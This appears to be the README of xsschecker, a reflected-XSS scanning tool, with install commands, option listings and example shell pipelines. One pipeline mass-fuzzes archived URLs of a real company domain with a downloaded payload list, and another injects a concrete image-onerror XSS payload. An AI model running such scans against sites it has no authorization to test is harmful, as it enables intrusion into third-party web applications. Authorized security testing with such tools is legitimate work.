## xsschecker

xsschecker tests endpoints for reflected XSS by injecting payloads and checking responses. It prints vulnerable if the payload is reflected, otherwise not vulnerable.

## Installation
```
go install github.com/rix4uni/xsschecker@latest
```

## Download prebuilt binaries
```
wget https://github.com/rix4uni/xsschecker/releases/download/v0.0.5/xsschecker-linux-amd64-0.0.5.tgz
tar -xvzf xsschecker-linux-amd64-0.0.5.tgz
rm -rf xsschecker-linux-amd64-0.0.5.tgz
mv xsschecker ~/go/bin/xsschecker
```
Or download [binary release](https://github.com/rix4uni/xsschecker/releases) for your platform.

## Compile from source
```
git clone --depth 1 github.com/rix4uni/xsschecker.git
cd xsschecker; go install
```

## Usage
```
Usage: xsschecker [OPTIONS]

Options:
  -H string
        Custom User-Agent header for HTTP requests. (default "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
  -ao string
        File to append the output instead of overwriting.
  -filter
        Print only URLs Exclude this from output, (e.g. Vulnerable/Not Vulnerable: [status] [server]).
  -i string
        Input file containing list of URLs.
  -match string
        The string(s) to match against the domain response. Separate multiple strings with commas. (required) (default "alert(1), confirm(1), prompt(1)")
  -maxssc int
        Maximum number of status code responses required before skipping all URLs from that domain, This flag only can be use with -ssc flag. (default 20)
  -nc
        Do not use colored output.
  -o string
        File to save the output.
  -proxy string
        Proxy server for HTTP requests. (e.g., http://127.0.0.1:8080)
  -retries int
        Number of retry attempts for failed HTTP requests. (default 1)
  -scdn string
        Comma-separated server names to skip all URLs for (e.g., "cloudflare,AkamaiGHost,CloudFront,Imperva").
  -ssc string
        Comma-separated status codes to skip all URLs from a domain if encountered (e.g., 403,400).
  -t int
        Number of concurrent threads. (default 20)
  -timeout int
        Timeout for HTTP requests in seconds. (default 15)
  -u string
        Single URL to test.
  -v    Enable verbose output for debugging purposes.
  -version
        Print the version of the tool and exit.
  -vuln
        If set, only vulnerable URLs will be printed.
```

## Usage Examples
### Reflected XSS Mass Automation
```
▶ Step 1:
wget https://raw.githubusercontent.com/rix4uni/WordList/refs/heads/main/payloads/xss/favourite.txt
if grep -qv "^rix4uni" "favourite.txt";then sed -i 's/^/rix4uni/' "favourite.txt";fi

▶ Step 2:
echo "dell.com" | subfinder -duc -silent -nc | waybackurls | urldedupe -s | grep -aE '=|%3D' | \
egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | \
pvreplace -silent -payload favourite.txt -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln

▶ Step 3:
You can run pyxss to check false positive or check manually one by one url in chrome
```

### Reflected XSS Oneliner for 1 payload
```
▶ Step 1:
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s | grep -aE '=|%3D' | \
egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | \
pvreplace -silent -payload 'rix4uni"><Img Src=OnXSS OnError=(confirm)(1)>' -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln

▶ Step 2:
You can run pyxss to check false positive or check manually one by one url in chrome
```

### Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
![image](https://github.com/rix4uni/xsschecker/assets/72344025/8034668c-42c3-47b1-9fee-5a58c2c96d63)
